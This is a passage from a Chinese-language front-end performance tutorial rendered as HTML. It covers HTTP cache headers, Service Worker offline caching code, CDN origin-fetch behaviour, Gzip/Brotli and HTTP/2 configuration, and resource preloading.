max-age=31536000, immutable&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) 动态 API（协商缓存）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /api/ &#123;<br>  <span class="hljs-attribute">add_header</span> Cache-Control <span class="hljs-string">&quot;no-cache&quot;</span>;<br>  <span class="hljs-attribute">etag</span> <span class="hljs-literal">on</span>;  <span class="hljs-comment"># 启用ETag</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(3) 混合策略</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=600, must-revalidate<br></code></pre></td></tr></table></figure><blockquote><p>600秒内强缓存 → 过期后必须验证（转为协商缓存）</p></blockquote><p><strong>浏览器行为验证</strong></p><ul><li>强缓存生效：Chrome DevTools → Network → Size列显示 (memory cache)</li><li>协商缓存生效：<ul><li>响应状态码 304</li><li>Headers中的 ETag&#x2F;Last-Modified 与请求头匹配</li></ul></li></ul><p><strong>缓存层级决策策略</strong></p><pre class="mermaid">graph TD  A[资源类型] --> B{是否版本化?}  B -->|是| C[强缓存: max-age=1年+immutable]  B -->|否| D{更新频率?}  D -->|高频更新| E[协商缓存: no-cache+ETag]  D -->|低频更新| F[强缓存: max-age=1小时]</pre><h3 id="Service-Worker离线缓存"><a href="#Service-Worker离线缓存" class="headerlink" title="Service Worker离线缓存"></a>Service Worker离线缓存</h3><p><strong>核心原理</strong></p><p>Service Worker 是浏览器独立于网页运行的脚本，作为网络请求的可编程代理，通过拦截请求实现离线缓存控制。</p><pre class="mermaid">graph LR  A[网页请求] --> B{Service Worker}  B -->|命中缓存| C[返回缓存]  B -->|未命中| D[转发请求 -> 网络]  D --> E[缓存新资源]</pre><p><strong>关键实现步骤</strong></p><p>(1) 注册与安装</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 主线程注册</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;serviceWorker&#x27;</span> <span class="hljs-keyword">in</span> navigator) &#123;<br>  navigator.<span class="hljs-property">serviceWorker</span>.<span class="hljs-title function_">register</span>(<span class="hljs-string">&#x27;/sw.js&#x27;</span>, &#123; <span class="hljs-attr">scope</span>: <span class="hljs-string">&#x27;/&#x27;</span> &#125;)<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">reg</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;SW注册成功&#x27;</span>))<br>    .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;SW注册失败&#x27;</span>, err));<br>&#125;<br></code></pre></td></tr></table></figure><p>sw.js - 安装阶段：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CACHE_NAME</span> = <span class="hljs-string">&#x27;v1-static&#x27;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PRE_CACHE_URLS</span> = [  <span class="hljs-comment">// 预缓存列表</span><br>  <span class="hljs-string">&#x27;/&#x27;</span>,<br>  <span class="hljs-string">&#x27;/index.html&#x27;</span>,<br>  <span class="hljs-string">&#x27;/styles.css&#x27;</span>,<br>  <span class="hljs-string">&#x27;/app.js&#x27;</span><br>];<br><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;install&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">CACHE_NAME</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> cache.<span class="hljs-title function_">addAll</span>(<span class="hljs-variable constant_">PRE_CACHE_URLS</span>))  <span class="hljs-comment">// 预缓存核心资源</span><br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> self.<span class="hljs-title function_">skipWaiting</span>())  <span class="hljs-comment">// 强制激活新SW</span><br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><p>(2) 缓存策略实施 - 拦截请求并响应：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">respondWith</span>(<br>    <span class="hljs-comment">// 策略1：缓存优先（离线优先）</span><br>    caches.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cached</span> =&gt;</span> cached || <span class="hljs-title function_">fetchAndCache</span>(event.<span class="hljs-property">request</span>))<br>    <br>    <span class="hljs-comment">// 策略2：网络优先（实时数据）</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    fetch(event.request)</span><br><span class="hljs-comment">      .catch(() =&gt; caches.match(event.request))</span><br><span class="hljs-comment">    */</span><br>  );<br>&#125;);<br><br><span class="hljs-comment">// 网络请求并缓存</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchAndCache</span>(<span class="hljs-params">request</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(request).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">networkRes</span> =&gt;</span> &#123;<br>    <span class="hljs-comment">// 克隆响应（流只能读取一次）</span><br>    <span class="hljs-keyword">const</span> resClone = networkRes.<span class="hljs-title function_">clone</span>();<br>    caches.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">CACHE_NAME</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> cache.<span class="hljs-title function_">put</span>(request, resClone));<br>    <span class="hljs-keyword">return</span> networkRes;<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>缓存更新机制</strong></p><p>(1) 版本化缓存命名</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 更新SW时修改版本号</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CACHE_NAME</span> = <span class="hljs-string">&#x27;v2-static&#x27;</span>;  <span class="hljs-comment">// 新版本</span><br></code></pre></td></tr></table></figure><p>(2) 激活阶段清理旧缓存</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;activate&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cacheNames</span> =&gt;</span> <br>      <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(<br>        cacheNames.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> &#123;<br>          <span class="hljs-keyword">if</span> (name !== <span class="hljs-variable constant_">CACHE_NAME</span>) <span class="hljs-keyword">return</span> caches.<span class="hljs-title function_">delete</span>(name); <span class="hljs-comment">// 删除旧缓存</span><br>        &#125;)<br>      ).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> self.<span class="hljs-property">clients</span>.<span class="hljs-title function_">claim</span>())  <span class="hljs-comment">// 立即控制所有页面</span><br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>性能优化技巧</strong></p><p>(1) 缓存分段策略</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CORE_CACHE</span> = <span class="hljs-string">&#x27;core-v1&#x27;</span>;   <span class="hljs-comment">// 核心页面</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">IMG_CACHE</span> = <span class="hljs-string">&#x27;images-v1&#x27;</span>;  <span class="hljs-comment">// 图片资源</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_CACHE</span> = <span class="hljs-string">&#x27;api-v1&#x27;</span>;     <span class="hljs-comment">// API数据</span><br></code></pre></td></tr></table></figure><p>(2) 动态缓存限制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 缓存最多50个API响应</span><br>caches.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">API_CACHE</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> &#123;<br>  cache.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">keys</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (keys.<span class="hljs-property">length</span> &gt; <span class="hljs-number">50</span>) cache.<span class="hljs-title function_">delete</span>(keys[<span class="hljs-number">0</span>]);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>(3) Stale-While-Revalidate</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">event.<span class="hljs-title function_">respondWith</span>(<br>  caches.<span class="hljs-title function_">match</span>(request).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cached</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> fetchPromise = <span class="hljs-title function_">fetchAndCache</span>(request);<br>    <span class="hljs-keyword">return</span> cached || fetchPromise;  <span class="hljs-comment">// 优先返回缓存，后台更新</span><br>  &#125;)<br>);<br></code></pre></td></tr></table></figure><p><strong>完整示例架构</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Text">/public<br>  ├── index.html<br>  ├── styles.css<br>  ├── app.js<br>  └── sw.js   # Service Worker主文件<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// sw.js</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CORE_CACHE</span> = <span class="hljs-string">&#x27;core-v1&#x27;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CORE_URLS</span> = [ <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;/offline.html&#x27;</span> ];<br><br><span class="hljs-comment">// 安装阶段</span><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;install&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">CORE_CACHE</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> cache.<span class="hljs-title function_">addAll</span>(<span class="hljs-variable constant_">CORE_URLS</span>))<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> self.<span class="hljs-title function_">skipWaiting</span>())<br>  );<br>&#125;);<br><br><span class="hljs-comment">// 激活清理</span><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;activate&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">keys</span> =&gt;</span> <br>      <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(keys.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> <br>        key !== <span class="hljs-variable constant_">CORE_CACHE</span> ? caches.<span class="hljs-title function_">delete</span>(key) : <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>()<br>      ))<br>    ).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> self.<span class="hljs-property">clients</span>.<span class="hljs-title function_">claim</span>())<br>  );<br>&#125;);<br><br><span class="hljs-comment">// 拦截请求</span><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; request &#125; = event;<br>  <br>  <span class="hljs-comment">// 导航请求回退到离线页面</span><br>  <span class="hljs-keyword">if</span> (request.<span class="hljs-property">mode</span> === <span class="hljs-string">&#x27;navigate&#x27;</span>) &#123;<br>    event.<span class="hljs-title function_">respondWith</span>(<br>      <span class="hljs-title function_">fetch</span>(request).<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> caches.<span class="hljs-title function_">match</span>(<span class="hljs-string">&#x27;/offline.html&#x27;</span>))<br>    );<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// 静态资源缓存优先</span><br>  event.<span class="hljs-title function_">respondWith</span>(<br>    caches.<span class="hljs-title function_">match</span>(request).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cached</span> =&gt;</span> <br>      cached || <span class="hljs-title function_">fetch</span>(request).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>        <span class="hljs-comment">// 仅缓存安全资源</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isCacheable</span>(request, res)) &#123;<br>          <span class="hljs-keyword">const</span> clone = res.<span class="hljs-title function_">clone</span>();<br>          caches.<span class="hljs-title function_">open</span>(<span class="hljs-title function_">dynamicCacheName</span>(request)).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> <br>            cache.<span class="hljs-title function_">put</span>(request, clone)<br>          );<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>      &#125;)<br>    )<br>  );<br>&#125;);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">isCacheable</span>(<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">return</span> req.<span class="hljs-property">method</span> === <span class="hljs-string">&#x27;GET&#x27;</span> &amp;&amp; <br>         res.<span class="hljs-property">status</span> === <span class="hljs-number">200</span> &amp;&amp; <br>         !req.<span class="hljs-property">url</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;/api/private&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-2-资源加载优化"><a href="#4-2-资源加载优化" class="headerlink" title="4.2 资源加载优化"></a>4.2 资源加载优化</h2><h3 id="CDN原理与缓存配置（边缘节点-回源策略）"><a href="#CDN原理与缓存配置（边缘节点-回源策略）" class="headerlink" title="CDN原理与缓存配置（边缘节点&#x2F;回源策略）"></a>CDN原理与缓存配置（边缘节点&#x2F;回源策略）</h3><p><strong>CDN 核心原理</strong></p><p>定义：内容分发网络（Content Delivery Network），通过全球分布的边缘节点缓存静态资源，使用户就近访问，降低延迟与源站压力。</p><pre class="mermaid">graph LR  A[用户] --> B{就近边缘节点}  B -->|资源命中| C[快速返回缓存]  B -->|资源未命中| D[回源站拉取资源]  D --> E[缓存至边缘节点]  E --> A</pre><p>三大核心组件：</p><ul><li>边缘节点（Edge Node）</li><li>回源策略（Origin Fetch）</li><li>调度系统（DNS负载均衡）</li></ul><p><strong>边缘节点（Edge Node）</strong></p><ul><li>位置：全球数百个POP点（Point of Presence）</li><li>功能：<ul><li>直接响应终端用户请求</li><li>缓存静态资源（HTML&#x2F;CSS&#x2F;JS&#x2F;图片&#x2F;视频）</li><li>执行安全防护（DDoS缓解&#x2F;WAF）</li></ul></li></ul><p><strong>回源策略（Origin Fetch）</strong></p><ul><li>触发条件：边缘节点无缓存或缓存过期</li><li>回源流程：</li></ul><pre class="mermaid">sequenceDiagram    participant User as 用户    participant EdgeNode as CDN边缘节点    participant Origin as 源站服务器    User->>EdgeNode: 1. 请求资源 /image.jpg    Note right of EdgeNode: 检查本地缓存    alt 缓存命中且有效        EdgeNode-->>User: 2. 直接返回缓存资源    else 缓存未命中或过期        EdgeNode->>Origin: 3. 回源请求 (携带缓存验证头)        Origin-->>EdgeNode: 4. 返回资源 + 缓存头        EdgeNode->>EdgeNode: 5. 缓存资源 (按策略)        EdgeNode-->>User: 6. 返回资源    end</pre><p><strong>调度系统（DNS负载均衡）</strong></p><ul><li>GSLB（全局负载均衡）：根据用户IP分配最近节点</li><li>调度算法：<ul><li>地理位置优先</li><li>节点健康检查</li><li>实时流量分析</li></ul></li></ul><p><strong>缓存配置策略</strong></p><p>(1) 规则设置</p><table><thead><tr><th align="left">配置方式</th><th align="left">指令示例</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">强制缓存</td><td align="left">Cache-Control: public, max-age&#x3D;86400</td><td align="left">资源在CDN缓存1天</td></tr><tr><td align="left">忽略缓存</td><td align="left">Cache-Control: no-store</td><td align="left">CDN不缓存（每次回源）</td></tr><tr><td align="left">条件缓存</td><td align="left">Cache-Control: no-cache</td><td align="left">CDN每次回源验证（类似协商缓存）</td></tr></tbody></table><p>(2) 典型资源配置</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># Nginx配置示例（源站）</span><br><span class="hljs-section">location</span> <span class="hljs-regexp">~* \.(js|css|png)$</span> &#123;<br>  <span class="hljs-attribute">add_header</span> Cache-Control <span class="hljs-string">&quot;public, max-age=31536000, immutable&quot;</span>;  <span class="hljs-comment"># 静态资源长缓存</span><br>&#125;<br><br><span class="hljs-section">location</span> /api/ &#123;<br>  <span class="hljs-attribute">add_header</span> Cache-Control <span class="hljs-string">&quot;no-cache&quot;</span>;  <span class="hljs-comment"># API不缓存</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>边缘节点缓存行为</strong></p><table><thead><tr><th align="left">请求状态</th><th align="left">处理方式</th><th align="left">响应时间对比源站</th></tr></thead><tbody><tr><td align="left">缓存命中</td><td align="left">直接返回资源</td><td align="left">快 5-10倍（&lt;50ms）</td></tr><tr><td align="left">缓存未命中</td><td align="left">回源拉取 → 缓存 → 返回</td><td align="left">与源站相同</td></tr><tr><td align="left">缓存过期</td><td align="left">回源验证（If-Modified-Since）</td><td align="left">节省带宽（304响应）</td></tr></tbody></table><h3 id="资源压缩（Gzip-Brotli）与HTTP-2多路复用"><a href="#资源压缩（Gzip-Brotli）与HTTP-2多路复用" class="headerlink" title="资源压缩（Gzip&#x2F;Brotli）与HTTP&#x2F;2多路复用"></a>资源压缩（Gzip&#x2F;Brotli）与HTTP&#x2F;2多路复用</h3><p><strong>资源压缩（Gzip vs Brotli）</strong></p><p>核心目标：减小资源体积 → 降低传输时间</p><table><thead><tr><th align="left">特性</th><th align="left">Gzip</th><th align="left">Brotli</th><th align="left">优势对比</th></tr></thead><tbody><tr><td align="left">压缩率</td><td align="left">减少70%大小</td><td align="left">减少85%大小</td><td align="left">Brotli高20%+</td></tr><tr><td align="left">算法原理</td><td align="left">DEFLATE算法（LZ77+哈夫曼）</td><td align="left">LZ77改进+上下文建模</td><td align="left">更高效字典压缩</td></tr><tr><td align="left">压缩速度</td><td align="left">快（低CPU消耗）</td><td align="left">慢（压缩时CPU高3倍）</td><td align="left">Gzip更适合动态压缩</td></tr><tr><td align="left">解压速度</td><td align="left">极快</td><td align="left">极快</td><td align="left">持平</td></tr><tr><td align="left">浏览器支持</td><td align="left">全平台（IE6+）</td><td align="left">Chrome&gt;50, Firefox&gt;44, Safari&gt;15</td><td align="left">Gzip兼容性更广</td></tr><tr><td align="left">最佳适用</td><td align="left">动态内容（API响应）</td><td align="left">静态资源（JS&#x2F;CSS&#x2F;字体）</td><td align="left"></td></tr></tbody></table><p>配置示例：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 启用双压缩策略</span><br><span class="hljs-attribute">gzip</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">gzip_types</span> text/plain text/css application/json application/javascript;<br><span class="hljs-attribute">gzip_min_length</span> <span class="hljs-number">1024</span>;  <span class="hljs-comment"># 大于1KB才压缩</span><br><br><span class="hljs-attribute">brotli</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">brotli_types</span> application/xml image/svg+xml;<br><span class="hljs-attribute">brotli_static</span> <span class="hljs-literal">on</span>;      <span class="hljs-comment"># 优先使用预压缩文件</span><br></code></pre></td></tr></table></figure><p>前端收益：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Text">原始文件： 200KB<br>Gzip后：  60KB（节省140KB）<br>Brotli后：30KB（节省170KB） → 3G网络下加载时间减少40%<br></code></pre></td></tr></table></figure><p><strong>HTTP&#x2F;2多路复用（Multiplexing）</strong></p><p>核心问题：HTTP&#x2F;1.1的队头阻塞（6个TCP连接限制）</p><pre class="mermaid">graph LR  A[HTTP/1.1] --> B[请求1] --> C[响应1] --> D[请求2] --> E[响应2]  F[HTTP/2] --> G[请求1/2/3] --> H[响应1/2/3 并行]</pre><p>实现原理：</p><ul><li>二进制分帧层：<ul><li>将请求&#x2F;响应分解为二进制帧（HEADERS&#x2F;DATA）</li><li>每个帧携带流ID（Stream Identifier）</li></ul></li><li>流优先级：</li></ul><pre class="mermaid">graph TB  S1[流ID11 CSS] -->|优先级高| 浏览器  S2[流ID13 JS] -->|优先级中| 浏览器  S3[流ID15 图片] -->|优先级低| 浏览器</pre><p>性能对比：</p><table><thead><tr><th align="left">场景</th><th align="left">HTTP&#x2F;1.1</th><th align="left">HTTP&#x2F;2</th><th align="left">提升</th></tr></thead><tbody><tr><td align="left">100个小文件（1KB）</td><td align="left">1.5s（6连接排队）</td><td align="left">0.3s（单连接并行）</td><td align="left">80%</td></tr><tr><td align="left">首屏渲染时间</td><td align="left">2.8s</td><td align="left">1.5s</td><td align="left">46%</td></tr><tr><td align="left">TCP连接数</td><td align="left">6-8个</td><td align="left">1个</td><td align="left">资源节省</td></tr></tbody></table><p><strong>HTTP&#x2F;2核心特性协同优化</strong></p><table><thead><tr><th align="left">特性</th><th align="left">配合压缩与多路复用的作用</th></tr></thead><tbody><tr><td align="left">头部压缩（HPACK）</td><td align="left">减少请求头体积（Cookie&#x2F;User-Agent等）</td></tr><tr><td align="left">服务器推送</td><td align="left">主动推送关键资源（无需等待HTML解析）</td></tr><tr><td align="left">流优先级</td><td align="left">优先传输CSS&#x2F;JS（保障渲染速度）</td></tr></tbody></table><p>完整工作流：</p><pre class="mermaid">sequenceDiagram    participant Client    participant Server    Client->>Server: 发起HTTPS连接（TLS握手）    Server->>Client: 返回HTTP/2协议支持    Client->>Server: 发送HEADERS帧（含HPACK压缩头）    Server->>Client: 推送关键CSS（PUSH_PROMISE帧）    Server->>Client: 并行传输HTML+CSS+JS（多DATA帧）    Client->>Browser: 流优先级排序 -> 快速渲染</pre><p><strong>实战优化策略</strong></p><p>(1) 压缩策略组合</p><ul><li>静态资源：预压缩Brotli（.br后缀） + 备用Gzip</li><li>动态内容：实时Gzip压缩（CPU消耗低）</li></ul><p>(2) HTTP&#x2F;2 最佳实践</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 强制启用HTTP/2</span><br><span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl http2; <br><br><span class="hljs-comment"># 启用服务器推送（需谨慎）</span><br><span class="hljs-attribute">http2_push</span> /style.css; <br><span class="hljs-attribute">http2_push</span> /app.js;<br></code></pre></td></tr></table></figure><p>(3) 资源加载优化</p><ul><li>减少域名分片（HTTP&#x2F;2下单域名更高效）</li><li>图片懒加载 + 异步加载非关键JS</li></ul><h3 id="预加载（preload）与预连接（preconnect）"><a href="#预加载（preload）与预连接（preconnect）" class="headerlink" title="预加载（preload）与预连接（preconnect）"></a>预加载（preload）与预连接（preconnect）</h3><p><strong>预加载（preload）</strong></p><p>核心作用：强制提前加载关键渲染资源，突破浏览器默认优先级限制，加速关键路径渲染。</p><pre class="mermaid">graph LR  A[HTML解析] --> B{发现 preload 标签}  B -->|立即请求| C[关键资源]  C --> D[提前加载完成]  D --> E[页面渲染直接使用]</pre><p>实现方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 基本用法 --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;font.woff2&quot; as=&quot;font&quot; type=&quot;font/woff2&quot; crossorigin&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;critical.css&quot; as=&quot;style&quot;&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;main.js&quot; as=&quot;script&quot;&gt;<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">&lt;!-- HTTP响应头方式（优先级更高） --&gt;<br><span class="hljs-attribute">Link</span><span class="hljs-punctuation">: </span>&lt;/critical.css&gt;; rel=preload; as=style<br></code></pre></td></tr></table></figure><p>关键特性：</p><table><thead><tr><th align="left">属性</th><th align="left">作用</th><th align="left">必填项</th></tr></thead><tbody><tr><td align="left">href</td><td align="left">资源路径</td><td align="left">✔️</td></tr><tr><td 